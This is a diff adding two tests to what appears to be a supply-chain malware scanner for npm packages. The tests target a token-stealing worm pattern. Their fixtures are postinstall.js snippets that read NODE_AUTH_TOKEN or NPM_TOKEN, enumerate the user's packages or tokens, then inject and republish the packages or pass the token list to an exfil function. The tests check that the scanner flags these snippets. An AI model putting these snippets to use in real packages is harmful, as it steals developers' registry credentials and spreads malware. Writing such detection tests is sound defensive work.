@@ -3980,3 +3980,40 @@ def test_persistence_extconf_dir_home_aws(tmp_path):
     )
     _, _, _, _, _, _, _, _, persistence, _ = _build_diff(old, new)
     assert persistence is True
+
+
+# ── Mini Shai-Hulud/TanStack: npm token enumeration worm ─────────────────────
+
+
+def test_worm_node_auth_token_and_packages_endpoint(tmp_path):
+    """NODE_AUTH_TOKEN + registry.npmjs.org/packages triggers worm_propagation_pattern."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "postinstall.js": (
+                "const token = process.env.NODE_AUTH_TOKEN;\n"
+                "fetch(`https://registry.npmjs.org/-/user/org.couchdb.user:${user}/packages?token=${token}`)\n"
+                "  .then(r => r.json()).then(pkgs => pkgs.forEach(p => injectAndPublish(p)));\n"
+            )
+        },
+    )
+    *_, worm = _build_diff(old, new)
+    assert worm is True
+
+
+def test_worm_npm_token_v1_tokens_endpoint(tmp_path):
+    """NPM_TOKEN + /-/npm/v1/tokens endpoint triggers worm_propagation_pattern."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "postinstall.js": (
+                "const t = process.env.NPM_TOKEN;\n"
+                "fetch('https://registry.npmjs.org/-/npm/v1/tokens', { headers: { Authorization: `Bearer ${t}` } })\n"
+                "  .then(r => r.json()).then(list => exfil(list));\n"
+            )
+        },
+    )
+    *_, worm = _build_diff(old, new)
+    assert worm is True
